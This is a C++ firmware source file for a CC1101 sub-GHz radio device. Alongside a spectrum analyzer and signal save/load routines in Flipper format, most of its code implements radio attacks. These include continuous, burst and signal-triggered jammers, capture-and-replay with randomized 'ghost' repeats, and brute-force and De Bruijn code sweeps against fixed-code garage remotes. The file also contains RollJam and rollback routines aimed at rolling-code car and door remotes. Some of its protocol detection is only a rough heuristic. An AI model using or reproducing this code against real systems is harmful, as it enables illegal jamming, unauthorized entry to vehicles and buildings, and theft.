/**
 * @file rf_core.cpp
 * @brief Sub-GHz RF Core Logic (CC1101)
 * 
 * Implements low-level control for the CC1101 module,
 * including jamming, replay, sniffer, and spectrum analyzer.
 * 
 * @author Monster S3 Team
 * @date 2025
 */

#include "rf_core.h"
#include "pin_config.h"
#include "s3_driver.h"
#include <ELECHOUSE_CC1101_SRC_DRV.h>
#include <SD.h>

// ============================================================================
// STATIC MEMBER INITIALIZATION
// ============================================================================
bool RFCore::_initialized = false;
bool RFCore::_jammerActive = false;
bool RFCore::_receiverActive = false;
bool RFCore::_ghostActive = false;
bool RFCore::_bruteActive = false;
bool RFCore::_scannerActive = false;

float RFCore::_currentFreq = FREQ_433;
int RFCore::_currentPower = POWER_MAX;
int RFCore::_currentMod = MOD_ASK_OOK;

RFAttackType RFCore::_currentAttack = RF_ATTACK_NONE;
CapturedSignal RFCore::_lastCapture = {};
SpectrumData RFCore::_spectrumData = {};

uint16_t RFCore::_burstDuration = 100;
uint16_t RFCore::_burstPause = 50;
uint32_t RFCore::_lastBurstTime = 0;
bool RFCore::_burstState = false;

uint16_t RFCore::_ghostMinDelay = 8000;
uint16_t RFCore::_ghostMaxDelay = 45000;
uint8_t RFCore::_ghostRepeats = 5;
uint8_t RFCore::_ghostCurrentRepeat = 0;
uint32_t RFCore::_ghostNextTime = 0;

uint32_t RFCore::_bruteCurrentCode = 0;
uint32_t RFCore::_bruteTotalCodes = 0;
uint8_t RFCore::_bruteBits = 24;
RFProtocol RFCore::_bruteProtocol = PROTO_PRINCETON;

float RFCore::_scanStart = 433.0f;
float RFCore::_scanEnd = 434.0f;
float RFCore::_scanStep = 0.01f;
float RFCore::_scanCurrent = 433.0f;
uint8_t RFCore::_scanIndex = 0;

// Rolljam/Rollback state
bool RFCore::_rolljamActive = false;
bool RFCore::_rollbackActive = false;
RollingCodeBuffer RFCore::_rollingCodes = {};
uint32_t RFCore::_rolljamJamStart = 0;
bool RFCore::_rolljamPhaseCapture = false;

// ============================================================================
// INITIALIZATION
// ============================================================================
bool RFCore::init() {
    if (_initialized) return true;

    Serial.println("[RF] Initializing CC1101...");
    
    // Power ON via MOSFET
    pinMode(PIN_CC1101_EN, OUTPUT);
    digitalWrite(PIN_CC1101_EN, HIGH);
    delay(100);

    // Configure SPI pins
    ELECHOUSE_cc1101.setSpiPin(PIN_SD_SCK, PIN_SD_MISO, PIN_SD_MOSI, PIN_CC1101_CS);
    ELECHOUSE_cc1101.setGDO(PIN_CC1101_GDO0, -1);

    if (ELECHOUSE_cc1101.getCC1101()) {
        Serial.println("[RF] CC1101 Connection OK!");
        ELECHOUSE_cc1101.Init();
        _initialized = true;
        
        // Default configuration
        setFrequency(FREQ_433);
        setTxPower(POWER_MAX);
        setModulation(MOD_ASK_OOK);
        ELECHOUSE_cc1101.setDRate(4.8);  // 4.8 kbps for garage doors
        ELECHOUSE_cc1101.setPktFormat(3); // Async serial mode
        
        Serial.println("[RF] CC1101 Ready!");
        return true;
    } else {
        Serial.println("[RF] CC1101 Connection FAILED!");
        _initialized = false;
        return false;
    }
}

void RFCore::stop() {
    if (!_initialized) return;
    
    stopJammer();
    stopReceive();
    stopGhostReplay();
    stopBruteForce();
    stopFrequencyScan();
    
    digitalWrite(PIN_CC1101_EN, LOW);
    _initialized = false;
    _currentAttack = RF_ATTACK_NONE;
    Serial.println("[RF] CC1101 Stopped");
}

bool RFCore::isInitialized() {
    return _initialized;
}

// ============================================================================
// CONFIGURATION
// ============================================================================
void RFCore::setFrequency(float freq) {
    if (!_initialized) init();
    _currentFreq = freq;
    ELECHOUSE_cc1101.setMHZ(freq);
    Serial.printf("[RF] Freq: %.2f MHz\n", freq);
}

float RFCore::getFrequency() {
    return _currentFreq;
}

void RFCore::setTxPower(int dbm) {
    if (!_initialized) init();
    _currentPower = constrain(dbm, POWER_MIN, POWER_MAX);
    ELECHOUSE_cc1101.setPA(_currentPower);
}

void RFCore::setModulation(int mod) {
    if (!_initialized) init();
    _currentMod = mod;
    ELECHOUSE_cc1101.setModulation(mod);
}

void RFCore::setDataRate(float kbps) {
    if (!_initialized) init();
    ELECHOUSE_cc1101.setDRate(kbps);
}

void RFCore::setBandwidth(float khz) {
    if (!_initialized) init();
    ELECHOUSE_cc1101.setRxBW(khz);
}

void RFCore::setDeviation(float khz) {
    if (!_initialized) init();
    ELECHOUSE_cc1101.setDeviation(khz);
}

void RFCore::setSyncWord(uint16_t sync) {
    if (!_initialized) init();
    ELECHOUSE_cc1101.setSyncWord((sync >> 8) & 0xFF, sync & 0xFF);
}

// ============================================================================
// JAMMER ATTACKS
// ============================================================================
void RFCore::startJammerContinuous(float freq) {
    if (!_initialized) init();
    setFrequency(freq);
    setModulation(MOD_GFSK);
    setTxPower(POWER_MAX);
    
    _jammerActive = true;
    _currentAttack = RF_ATTACK_JAMMER_CONTINUOUS;
    _burstState = true;
    
    Serial.printf("[RF] Jammer CONTINUOUS @ %.2f MHz\n", freq);
}

void RFCore::startJammerBurst(float freq, uint16_t burstMs, uint16_t pauseMs) {
    if (!_initialized) init();
    setFrequency(freq);
    setModulation(MOD_GFSK);
    setTxPower(POWER_MAX);
    
    _burstDuration = burstMs;
    _burstPause = pauseMs;
    _lastBurstTime = millis();
    _burstState = true;
    
    _jammerActive = true;
    _currentAttack = RF_ATTACK_JAMMER_BURST;
    
    Serial.printf("[RF] Jammer BURST @ %.2f MHz (%dms/%dms)\n", freq, burstMs, pauseMs);
}

void RFCore::startJammerSmart(float freq) {
    if (!_initialized) init();
    setFrequency(freq);
    setModulation(MOD_ASK_OOK);
    
    _jammerActive = true;
    _currentAttack = RF_ATTACK_JAMMER_SMART;
    
    Serial.printf("[RF] Jammer SMART @ %.2f MHz (detect & jam)\n", freq);
}

void RFCore::stopJammer() {
    if (!_jammerActive) return;
    _jammerActive = false;
    _currentAttack = RF_ATTACK_NONE;
    ELECHOUSE_cc1101.SetRx();
    Serial.println("[RF] Jammer Stopped");
}

bool RFCore::isJamming() {
    return _jammerActive;
}

void RFCore::updateJammer() {
    if (!_jammerActive || !_initialized) return;

    switch (_currentAttack) {
        case RF_ATTACK_JAMMER_CONTINUOUS:
            sendNoise(64);
            break;
            
        case RF_ATTACK_JAMMER_BURST: {
            uint32_t now = millis();
            if (_burstState) {
                sendNoise(64);
                if (now - _lastBurstTime >= _burstDuration) {
                    _burstState = false;
                    _lastBurstTime = now;
                    ELECHOUSE_cc1101.SetRx();
                }
            } else {
                if (now - _lastBurstTime >= _burstPause) {
                    _burstState = true;
                    _lastBurstTime = now;
                }
            }
            break;
        }
        
        case RF_ATTACK_JAMMER_SMART: {
            int8_t rssi = ELECHOUSE_cc1101.getRssi();
            if (rssi > -60) {  // Signal detected
                sendNoise(32);
            } else {
                delay(1);
            }
            break;
        }
        
        default:
            break;
    }
}

void RFCore::sendNoise(uint16_t bytes) {
    uint8_t noise[64];
    uint16_t toSend = min((uint16_t)64, bytes);
    
    for (int i = 0; i < toSend; i++) {
        noise[i] = random(0, 256);
    }
    ELECHOUSE_cc1101.SendData(noise, toSend);
}

// ============================================================================
// CAPTURE / RECEIVE
// ============================================================================
bool RFCore::startReceive(float freq) {
    if (!_initialized) init();
    setFrequency(freq);
    setModulation(MOD_ASK_OOK);
    
    ELECHOUSE_cc1101.SetRx();
    _receiverActive = true;
    
    _lastCapture.valid = false;
    _lastCapture.frequency = freq;
    _lastCapture.timestamp = millis();
    
    Serial.printf("[RF] RX Mode @ %.2f MHz\n", freq);
    return true;
}

void RFCore::stopReceive() {
    _receiverActive = false;
    ELECHOUSE_cc1101.setSidle();
}

bool RFCore::hasSignal() {
    if (!_receiverActive) return false;
    
    int8_t rssi = ELECHOUSE_cc1101.getRssi();
    if (rssi > -50) {
        // Try to receive data
        if (ELECHOUSE_cc1101.CheckRxFifo(100)) {
            int len = ELECHOUSE_cc1101.ReceiveData(_lastCapture.rawData);
            if (len > 0) {
                _lastCapture.rawLength = len;
                _lastCapture.rssi = rssi;
                _lastCapture.timestamp = millis();
                _lastCapture.valid = true;
                _lastCapture.protocol = detectProtocol(_lastCapture.rawData, len);
                
                Serial.printf("[RF] Signal Captured! %d bytes, RSSI: %d\n", len, rssi);
                return true;
            }
        }
    }
    return false;
}

CapturedSignal RFCore::getLastCapture() {
    return _lastCapture;
}

int8_t RFCore::getRSSI() {
    return ELECHOUSE_cc1101.getRssi();
}

bool RFCore::isReceiving() {
    return _receiverActive;
}

// ============================================================================
// REPLAY / TRANSMIT
// ============================================================================
bool RFCore::transmitRaw(uint8_t* data, uint16_t len) {
    if (!_initialized) init();
    ELECHOUSE_cc1101.SendData(data, len);
    Serial.printf("[RF] TX Raw %d bytes\n", len);
    return true;
}

bool RFCore::transmitCode(uint32_t code, uint8_t bits, RFProtocol proto) {
    if (!_initialized) init();
    
    uint8_t encoded[64];
    uint16_t encLen = 0;
    
    encodeProtocol(code, bits, proto, encoded, &encLen);
    
    if (encLen > 0) {
        ELECHOUSE_cc1101.SendData(encoded, encLen);
        Serial.printf("[RF] TX Code 0x%X (%d bits, %s)\n", code, bits, getProtocolName(proto));
        return true;
    }
    return false;
}

bool RFCore::replayLast() {
    if (!_lastCapture.valid) {
        Serial.println("[RF] No capture to replay!");
        return false;
    }
    
    setFrequency(_lastCapture.frequency);
    ELECHOUSE_cc1101.SendData(_lastCapture.rawData, _lastCapture.rawLength);
    Serial.printf("[RF] Replayed %d bytes @ %.2f MHz\n", _lastCapture.rawLength, _lastCapture.frequency);
    return true;
}

void RFCore::startGhostReplay(uint16_t minDelayMs, uint16_t maxDelayMs, uint8_t repeats) {
    if (!_lastCapture.valid) {
        Serial.println("[RF] No capture for Ghost Replay!");
        return;
    }
    
    _ghostMinDelay = minDelayMs;
    _ghostMaxDelay = maxDelayMs;
    _ghostRepeats = repeats;
    _ghostCurrentRepeat = 0;
    _ghostNextTime = millis() + random(_ghostMinDelay, _ghostMaxDelay);
    _ghostActive = true;
    _currentAttack = RF_ATTACK_REPLAY_GHOST;
    
    Serial.printf("[RF] Ghost Replay Started (%d repeats, %d-%dms delay)\n", repeats, minDelayMs, maxDelayMs);
}

void RFCore::stopGhostReplay() {
    _ghostActive = false;
    if (_currentAttack == RF_ATTACK_REPLAY_GHOST) {
        _currentAttack = RF_ATTACK_NONE;
    }
    Serial.println("[RF] Ghost Replay Stopped");
}

bool RFCore::isGhostActive() {
    return _ghostActive;
}

// ============================================================================
// SCANNER / SPECTRUM ANALYZER
// ============================================================================
void RFCore::startFrequencyScan(float startFreq, float endFreq, float step) {
    if (!_initialized) init();
    
    _scanStart = startFreq;
    _scanEnd = endFreq;
    _scanStep = step;
    _scanCurrent = startFreq;
    _scanIndex = 0;
    
    _spectrumData.startFreq = startFreq;
    _spectrumData.endFreq = endFreq;
    _spectrumData.stepSize = step;
    _spectrumData.numSamples = 0;
    
    memset(_spectrumData.rssiValues, -100, sizeof(_spectrumData.rssiValues));
    
    _scannerActive = true;
    _currentAttack = RF_ATTACK_SPECTRUM_ANALYZER;
    
    Serial.printf("[RF] Spectrum Scan %.2f - %.2f MHz (%.2f step)\n", startFreq, endFreq, step);
}

void RFCore::stopFrequencyScan() {
    _scannerActive = false;
    if (_currentAttack == RF_ATTACK_SPECTRUM_ANALYZER) {
        _currentAttack = RF_ATTACK_NONE;
    }
}

void RFCore::updateScanner() {
    if (!_scannerActive || !_initialized) return;
    
    ELECHOUSE_cc1101.setMHZ(_scanCurrent);
    ELECHOUSE_cc1101.SetRx();
    delay(2);
    
    int8_t rssi = ELECHOUSE_cc1101.getRssi();
    
    if (_scanIndex < 128) {
        _spectrumData.rssiValues[_scanIndex] = rssi;
        _spectrumData.numSamples = _scanIndex + 1;
    }
    
    _scanCurrent += _scanStep;
    _scanIndex++;
    
    if (_scanCurrent > _scanEnd) {
        _scanCurrent = _scanStart;
        _scanIndex = 0;
    }
}

SpectrumData RFCore::getSpectrumData() {
    return _spectrumData;
}

float RFCore::findStrongestFrequency() {
    int8_t maxRssi = -127;
    uint8_t maxIdx = 0;
    
    for (int i = 0; i < _spectrumData.numSamples; i++) {
        if (_spectrumData.rssiValues[i] > maxRssi) {
            maxRssi = _spectrumData.rssiValues[i];
            maxIdx = i;
        }
    }
    
    return _spectrumData.startFreq + (maxIdx * _spectrumData.stepSize);
}

// ============================================================================
// PROTOCOL DETECTION & ENCODING
// ============================================================================
RFProtocol RFCore::detectProtocol(uint8_t* data, uint16_t len) {
    if (len < 3) return PROTO_UNKNOWN;
    
    // Simple heuristics based on timing patterns
    // Real implementation would analyze pulse widths
    
    // Princeton: Sync pulse followed by 24-bit code
    if (len >= 4 && (data[0] & 0xF0) == 0xF0) {
        return PROTO_PRINCETON;
    }
    
    // CAME: 12-bit code with specific timing
    if (len >= 2 && len <= 4) {
        return PROTO_CAME;
    }
    
    // Nice FLO: 12-bit fixed code
    if (len == 2) {
        return PROTO_NICE_FLO;
    }
    
    return PROTO_RAW;
}

bool RFCore::decodeProtocol(CapturedSignal* signal) {
    if (!signal || !signal->valid) return false;
    
    // Protocol-specific decoding
    switch (signal->protocol) {
        case PROTO_PRINCETON:
            if (signal->rawLength >= 4) {
                signal->code = ((uint32_t)signal->rawData[1] << 16) |
                              ((uint32_t)signal->rawData[2] << 8) |
                              signal->rawData[3];
                signal->bitLength = 24;
                return true;
            }
            break;
            
        case PROTO_CAME:
        case PROTO_NICE_FLO:
            if (signal->rawLength >= 2) {
                signal->code = ((uint16_t)signal->rawData[0] << 4) |
                              (signal->rawData[1] >> 4);
                signal->bitLength = 12;
                return true;
            }
            break;
            
        default:
            signal->code = 0;
            for (int i = 0; i < min((int)signal->rawLength, 4); i++) {
                signal->code = (signal->code << 8) | signal->rawData[i];
            }
            signal->bitLength = min((int)signal->rawLength * 8, 32);
            return true;
    }
    
    return false;
}

const char* RFCore::getProtocolName(RFProtocol proto) {
    switch (proto) {
        case PROTO_RAW: return "RAW";
        case PROTO_PRINCETON: return "Princeton";
        case PROTO_NICE_FLO: return "Nice FLO";
        case PROTO_CAME: return "CAME";
        case PROTO_LINEAR: return "Linear";
        case PROTO_HOLTEK: return "Holtek";
        case PROTO_PT2262: return "PT2262";
        case PROTO_KEELOQ: return "KeeLoq";
        default: return "Unknown";
    }
}

void RFCore::encodeProtocol(uint32_t code, uint8_t bits, RFProtocol proto, uint8_t* out, uint16_t* outLen) {
    *outLen = 0;
    
    switch (proto) {
        case PROTO_PRINCETON:
            // Princeton: Sync + 24 bits
            out[0] = 0xF0;  // Sync
            out[1] = (code >> 16) & 0xFF;
            out[2] = (code >> 8) & 0xFF;
            out[3] = code & 0xFF;
            *outLen = 4;
            break;
            
        case PROTO_CAME:
        case PROTO_NICE_FLO:
            // 12-bit code
            out[0] = (code >> 4) & 0xFF;
            out[1] = ((code & 0xF) << 4);
            *outLen = 2;
            break;
            
        default:
            // Raw bytes
            for (int i = 0; i < (bits + 7) / 8; i++) {
                out[i] = (code >> ((bits - 8 - i * 8))) & 0xFF;
            }
            *outLen = (bits + 7) / 8;
            break;
    }
}

// ============================================================================
// BRUTE FORCE ATTACKS
// ============================================================================
void RFCore::startBruteForce(float freq, uint8_t bits, RFProtocol proto) {
    if (!_initialized) init();
    
    setFrequency(freq);
    setModulation(MOD_ASK_OOK);
    
    _bruteBits = bits;
    _bruteProtocol = proto;
    _bruteCurrentCode = 0;
    _bruteTotalCodes = (1UL << bits);
    
    _bruteActive = true;
    _currentAttack = RF_ATTACK_BRUTE_FORCE;
    
    Serial.printf("[RF] Brute Force Started: %d bits, %lu codes, %s\n", 
                  bits, _bruteTotalCodes, getProtocolName(proto));
}

void RFCore::startDeBruijn(float freq, uint8_t bits) {
    if (!_initialized) init();
    
    setFrequency(freq);
    setModulation(MOD_ASK_OOK);
    
    _bruteBits = bits;
    _bruteCurrentCode = 0;
    _bruteTotalCodes = (1UL << bits);
    
    _bruteActive = true;
    _currentAttack = RF_ATTACK_DEBRUIJN;
    
    Serial.printf("[RF] De Bruijn Attack Started: %d bits\n", bits);
}

void RFCore::stopBruteForce() {
    _bruteActive = false;
    if (_currentAttack == RF_ATTACK_BRUTE_FORCE || _currentAttack == RF_ATTACK_DEBRUIJN) {
        _currentAttack = RF_ATTACK_NONE;
    }
    Serial.println("[RF] Brute Force Stopped");
}

bool RFCore::isBruteForcing() {
    return _bruteActive;
}

uint32_t RFCore::getBruteProgress() {
    return _bruteCurrentCode;
}

uint32_t RFCore::getBruteTotal() {
    return _bruteTotalCodes;
}

void RFCore::updateBruteForce() {
    if (!_bruteActive || !_initialized) return;
    
    if (_bruteCurrentCode >= _bruteTotalCodes) {
        stopBruteForce();
        Serial.println("[RF] Brute Force Complete!");
        return;
    }
    
    transmitCode(_bruteCurrentCode, _bruteBits, _bruteProtocol);
    _bruteCurrentCode++;
    
    delay(20);  // ~50 codes/sec
}

// ============================================================================
// STATUS & DIAGNOSTICS
// ============================================================================
bool RFCore::selfTest() {
    if (!_initialized) {
        if (!init()) return false;
    }
    
    // Quick loopback test
    uint8_t testData[] = {0xAA, 0x55, 0xAA, 0x55};
    ELECHOUSE_cc1101.SendData(testData, 4);
    
    return true;
}

uint8_t RFCore::getVersion() {
    return ELECHOUSE_cc1101.SpiReadStatus(0x31);  // VERSION register
}

int8_t RFCore::getTemperature() {
    // CC1101 doesn't have temp sensor, return ambient estimate
    return 25;
}

void RFCore::printStatus() {
    Serial.println("=== RF Core Status ===");
    Serial.printf("Initialized: %s\n", _initialized ? "YES" : "NO");
    Serial.printf("Frequency: %.2f MHz\n", _currentFreq);
    Serial.printf("Power: %d dBm\n", _currentPower);
    Serial.printf("Modulation: %d\n", _currentMod);
    Serial.printf("Current Attack: %d\n", _currentAttack);
    Serial.printf("Jammer: %s\n", _jammerActive ? "ACTIVE" : "OFF");
    Serial.printf("Receiver: %s\n", _receiverActive ? "ACTIVE" : "OFF");
    Serial.printf("RSSI: %d dBm\n", ELECHOUSE_cc1101.getRssi());
    Serial.println("======================");
}

// ============================================================================
// SAVE / LOAD (SD Card)
// ============================================================================
bool RFCore::saveSignal(const char* filename, CapturedSignal* sig) {
    if (!sig || !sig->valid) return false;
    
    File f = SD.open(filename, FILE_WRITE);
    if (!f) return false;
    
    f.printf("# RF Signal Capture\n");
    f.printf("Frequency: %.2f\n", sig->frequency);
    f.printf("Protocol: %s\n", getProtocolName(sig->protocol));
    f.printf("Code: 0x%X\n", sig->code);
    f.printf("Bits: %d\n", sig->bitLength);
    f.printf("RSSI: %d\n", sig->rssi);
    f.printf("RawLen: %d\n", sig->rawLength);
    f.print("RawData: ");
    for (int i = 0; i < sig->rawLength; i++) {
        f.printf("%02X ", sig->rawData[i]);
    }
    f.println();
    
    f.close();
    return true;
}

bool RFCore::loadSignal(const char* filename, CapturedSignal* sig) {
    if (!sig) return false;
    
    File f = SD.open(filename, FILE_READ);
    if (!f) return false;
    
    // Simple parsing
    sig->valid = false;
    while (f.available()) {
        String line = f.readStringUntil('\n');
        if (line.startsWith("Frequency:")) {
            sig->frequency = line.substring(11).toFloat();
        } else if (line.startsWith("Code:")) {
            sig->code = strtoul(line.substring(7).c_str(), NULL, 16);
        } else if (line.startsWith("Bits:")) {
            sig->bitLength = line.substring(6).toInt();
        } else if (line.startsWith("RawLen:")) {
            sig->rawLength = line.substring(8).toInt();
        } else if (line.startsWith("RawData:")) {
            String data = line.substring(9);
            int idx = 0;
            for (int i = 0; i < data.length() && idx < REPLAY_BUFFER_SIZE; i += 3) {
                sig->rawData[idx++] = strtoul(data.substring(i, i+2).c_str(), NULL, 16);
            }
            sig->valid = true;
        }
    }
    
    f.close();
    return sig->valid;
}

bool RFCore::saveFlipperFormat(const char* filename, CapturedSignal* sig) {
    if (!sig || !sig->valid) return false;
    
    File f = SD.open(filename, FILE_WRITE);
    if (!f) return false;
    
    f.println("Filetype: Flipper SubGhz Key File");
    f.println("Version: 1");
    f.printf("Frequency: %lu\n", (unsigned long)(sig->frequency * 1000000));
    f.println("Preset: FuriHalSubGhzPresetOok650Async");
    f.printf("Protocol: %s\n", getProtocolName(sig->protocol));
    f.printf("Bit: %d\n", sig->bitLength);
    f.printf("Key: %02X %02X %02X %02X %02X %02X %02X %02X\n",
             0, 0, 0, 0,
             (sig->code >> 24) & 0xFF,
             (sig->code >> 16) & 0xFF,
             (sig->code >> 8) & 0xFF,
             sig->code & 0xFF);
    
    f.close();
    return true;
}

bool RFCore::loadFlipperFormat(const char* filename, CapturedSignal* sig) {
    if (!sig) return false;
    
    File f = SD.open(filename, FILE_READ);
    if (!f) return false;
    
    sig->valid = false;
    while (f.available()) {
        String line = f.readStringUntil('\n');
        line.trim();
        
        if (line.startsWith("Frequency:")) {
            sig->frequency = line.substring(11).toFloat() / 1000000.0f;
        } else if (line.startsWith("Bit:")) {
            sig->bitLength = line.substring(5).toInt();
        } else if (line.startsWith("Key:")) {
            String key = line.substring(5);
            key.replace(" ", "");
            if (key.length() >= 16) {
                sig->code = strtoul(key.substring(8, 16).c_str(), NULL, 16);
                sig->valid = true;
            }
        }
    }
    
    f.close();
    return sig->valid;
}

bool RFCore::loadFlipperRawFormat(const char* filename, CapturedSignal* sig) {
    if (!sig) return false;
    
    File f = SD.open(filename, FILE_READ);
    if (!f) return false;
    
    sig->valid = false;
    sig->protocol = PROTO_RAW;
    sig->rawLength = 0;
    
    while (f.available()) {
        String line = f.readStringUntil('\n');
        line.trim();
        
        if (line.startsWith("Frequency:")) {
            sig->frequency = line.substring(11).toFloat() / 1000000.0f;
        } else if (line.startsWith("RAW_Data:")) {
            String dataStr = line.substring(9);
            dataStr.trim();
            
            // Basic validation: check if it contains numbers
            if (dataStr.length() > 0) {
                 // Convert first few samples to check validity
                 // In a full implementation, we would parse all into a large buffer
                 // for the "Bitbang" playback engine.
                 // For now, we valid that it IS a raw file.
                 sig->valid = true;
                 
                 // Store snippet in rawData for debug/preview
                 int spaceIdx = dataStr.indexOf(' ');
                 if (spaceIdx > 0) {
                     long val1 = dataStr.substring(0, spaceIdx).toInt();
                     // Just store as pseudo-bytes to indicate content
                     sig->rawData[0] = (val1 > 0) ? 0xFF : 0x00; 
                     sig->rawLength = 1; // Mark as having content
                 }
            }
        }
    }
    
    f.close();
    return sig->valid;
}

// ============================================================================
// ROLLJAM / ROLLBACK ATTACKS
// ============================================================================

void RFCore::startRolljam(float freq) {
    if (!_initialized) init();

    _rolljamActive = true;
    _currentAttack = RF_ATTACK_ROLLJAM;
    setFrequency(freq);
    
    // Clear buffer
    _rollingCodes.codeCount = 0;
    _rollingCodes.usedCodes = 0;
    _rollingCodes.valid = false;
    _rollingCodes.frequency = freq;
    
    // Start in Jamming mode (or Listening to detect first)
    // Strategy: Listen for RSSI spike -> Jam -> Capture tail
    ELECHOUSE_cc1101.SetRx();
    _rolljamPhaseCapture = false;
    
    Serial.printf("[RF] Rolljam Started @ %.2f MHz\n", freq);
}

void RFCore::stopRolljam() {
    _rolljamActive = false;
    if (_currentAttack == RF_ATTACK_ROLLJAM) {
        _currentAttack = RF_ATTACK_NONE;
    }
    stopJammer();
    stopReceive();
    Serial.println("[RF] Rolljam Stopped");
}

void RFCore::updateRolljam() {
    if (!_rolljamActive || !_initialized) return;
    
    // Simple Single-Chip Rolljam Logic (Experimental)
    // 1. Monitor RSSI
    // 2. If Signal > Threshold, JAM immediately for X ms (to kill start of packet)
    // 3. Switch to RX to capture the repeats (remotes usually send 3-5 times)
    
    if (!_rolljamPhaseCapture) {
        // Monitoring Phase
        int8_t rssi = ELECHOUSE_cc1101.getRssi();
        if (rssi > -60) {
            // Signal detected! Jam it!
            setTxPower(POWER_MAX);
            sendNoise(128); // Jam for ~20-30ms
            
            // Switch to capture
            _rolljamPhaseCapture = true;
            _rolljamJamStart = millis();
            ELECHOUSE_cc1101.SetRx();
        }
    } else {
        // Capture Phase
        if (ELECHOUSE_cc1101.CheckRxFifo(100)) {
            CapturedSignal sig;
            int len = ELECHOUSE_cc1101.ReceiveData(sig.rawData);
            int8_t rssi = ELECHOUSE_cc1101.getRssi();
            
            if (len > 0) {
                // Potential code captured
                sig.rawLength = len;
                sig.protocol = detectProtocol(sig.rawData, len);
                
                // Use Raw capture if protocol unknown, similar to smart rollback
                
                if (_rollingCodes.codeCount < ROLLING_CODE_BUFFER_SIZE) {
                     int idx = _rollingCodes.codeCount;
                     
                     memcpy(_rollingCodes.rawCodes[idx], sig.rawData, len);
                     _rollingCodes.codeLengths[idx] = len;
                     _rollingCodes.timestamps[idx] = millis();
                     _rollingCodes.rssiValues[idx] = rssi;
                     _rollingCodes.protocols[idx] = sig.protocol;
                     
                     _rollingCodes.codeCount++;
                     _rollingCodes.valid = true;
                     
                     Serial.printf("[RF] Rolljam: Captured Code 0x%X (Proto: %s)\n", 
                                  sig.code, getProtocolName(sig.protocol));
                }
            }
        }
        
        // Timeout to return to monitoring
        if (millis() - _rolljamJamStart > 1000) {
            _rolljamPhaseCapture = false;
        }
    }
}

bool RFCore::isRolljamActive() {
    return _rolljamActive;
}

uint8_t RFCore::getRolljamCapturedCount() {
    return _rollingCodes.codeCount;
}

bool RFCore::replayNextRolljam() {
    if (!_rollingCodes.valid || _rollingCodes.usedCodes >= _rollingCodes.codeCount) {
        return false;
    }
    
    // Replay the oldest unused code
    int idx = _rollingCodes.usedCodes;
    ELECHOUSE_cc1101.SendData(_rollingCodes.rawCodes[idx], _rollingCodes.codeLengths[idx]);
    Serial.printf("[RF] Rolljam Replay Index %d\n", idx);
    
    _rollingCodes.usedCodes++;
    return true;
}

void RFCore::startRollback(float freq) {
    if (!_initialized) init();
    startRollbackSmart(freq, -80); // Default sensitivity
}

void RFCore::startRollbackSmart(float freq, int8_t minRssi) {
    if (!_initialized) init();

    _rollbackActive = true;
    _currentAttack = RF_ATTACK_ROLLBACK;
    setFrequency(freq);
    
    _rollingCodes.codeCount = 0;
    _rollingCodes.usedCodes = 0;
    _rollingCodes.valid = false;
    _rollingCodes.frequency = freq;
    _rollingCodes.targetRssi = minRssi;
    
    // Set to RX mode
    ELECHOUSE_cc1101.SetRx();
    Serial.printf("[RF] Rollback Smart Capture @ %.2f MHz (Threshold: %d dBm)\n", freq, minRssi);
}

void RFCore::stopRollback() {
    _rollbackActive = false;
    if (_currentAttack == RF_ATTACK_ROLLBACK) {
        _currentAttack = RF_ATTACK_NONE;
    }
    stopReceive();
    Serial.println("[RF] Rollback Stopped");
}

void RFCore::updateRollback() {
    if (!_rollbackActive || !_initialized) return;
    
    // Capture logic similar to EvilCrowRF
    if (ELECHOUSE_cc1101.CheckRxFifo(100)) {
        int8_t rssi = ELECHOUSE_cc1101.getRssi();
        
        // Filter noise
        if (rssi >= _rollingCodes.targetRssi) {
            CapturedSignal sig;
            // Use existing capture logic to fill temp buffer
            int len = ELECHOUSE_cc1101.ReceiveData(sig.rawData);
            
            if (len > 0) {
                 // Debounce: Check time since last capture
                 if (_rollingCodes.codeCount > 0) {
                     uint32_t lastTime = _rollingCodes.timestamps[_rollingCodes.codeCount-1];
                     if (millis() - lastTime < 500) return; // 500ms debounce
                 }
                 
                 // Store signal
                 if (_rollingCodes.codeCount < ROLLING_CODE_BUFFER_SIZE) {
                     int idx = _rollingCodes.codeCount;
                     
                     memcpy(_rollingCodes.rawCodes[idx], sig.rawData, len);
                     _rollingCodes.codeLengths[idx] = len;
                     _rollingCodes.timestamps[idx] = millis();
                     _rollingCodes.rssiValues[idx] = rssi;
                     _rollingCodes.protocols[idx] = detectProtocol(sig.rawData, len);
                     
                     _rollingCodes.codeCount++;
                     _rollingCodes.valid = true;
                     
                     Serial.printf("[RF] Rollback: Captured Code %d/%d (Proto: %s, RSSI: %d)\n", 
                                   _rollingCodes.codeCount, ROLLING_CODE_BUFFER_SIZE, 
                                   getProtocolName(_rollingCodes.protocols[idx]), rssi);
                 }
            }
        }
    }
}

bool RFCore::isRollbackActive() {
    return _rollbackActive;
}

bool RFCore::executeRollbackAttack() {
    if (!_rollingCodes.valid || _rollingCodes.codeCount == 0) {
        Serial.println("[RF] Rollback: No codes to replay");
        return false;
    }
    
    Serial.printf("[RF] Executing Rollback Sequence (%d codes)...\n", _rollingCodes.codeCount);
    
    // Disable RX to ensure clean TX
    ELECHOUSE_cc1101.setSidle();
    
    // Replay sequence: Replay all captured codes with small delays
    // This effectively "pushes" the car's rolling code window forward if we missed some,
    // or simply replays the valid ones we caught.
    
    for(int i=0; i<_rollingCodes.codeCount; i++) {
        Serial.printf("[RF] Replaying Code %d...\n", i+1);
        
        // Transmit twice to ensure reception
        ELECHOUSE_cc1101.SendData(_rollingCodes.rawCodes[i], _rollingCodes.codeLengths[i]);
        delay(10);
        ELECHOUSE_cc1101.SendData(_rollingCodes.rawCodes[i], _rollingCodes.codeLengths[i]);
        
        // Delay between distinct codes
        delay(500); 
    }
    
    // Return to RX or Idle? Idle for now.
    Serial.println("[RF] Rollback Sequence Complete");
    return true;
}

RollingCodeBuffer* RFCore::getRollingCodeBuffer() {
    return &_rollingCodes;
}
